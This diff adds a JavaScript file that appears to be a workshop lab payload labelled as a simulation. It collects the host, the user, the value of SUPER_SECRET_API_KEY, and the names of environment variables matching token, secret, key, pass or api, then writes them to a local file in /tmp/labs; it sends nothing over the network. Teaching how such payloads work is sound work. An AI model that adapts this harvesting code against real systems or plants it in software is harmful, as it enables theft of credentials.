@@ -1,0 +1,24 @@
+const fs = loadModule('fs');
+const path = loadModule('path');
+const os = loadModule('os');
+const stamp = new Date().toISOString().replace(/[:.]/g, '-');
+const dir = '/tmp/labs';
+try { fs.mkdirSync(dir, { recursive: true }); } catch (_) {}
+const out = path.join(dir, 'lab-1a-extracted-credentials-' + stamp + '.txt');
+const interesting = Object.keys(process.env).filter(function (k) { return /token|secret|key|pass|api/i.test(k); }).sort();
+const lines = [];
+lines.push('=== exfiltrated by remote payload (LAB SIMULATION) ===');
+lines.push('timestamp: ' + stamp);
+lines.push('host: ' + os.hostname());
+lines.push('user: ' + (process.env.USER || 'unknown'));
+lines.push('cwd: ' + process.cwd());
+lines.push('node: ' + process.version);
+lines.push('');
+lines.push('-- stolen workshop credential --');
+lines.push('SUPER_SECRET_API_KEY: ' + (process.env.SUPER_SECRET_API_KEY || '<not set>'));
+lines.push('');
+lines.push('-- env keys matching /token|secret|key|pass|api/i (names only) --');
+interesting.forEach(function (k) { lines.push('  ' + k); });
+lines.push('');
+lines.push('=== a real attacker would post all of the above to their C2 ===');
+fs.writeFileSync(out, lines.join('\n'));
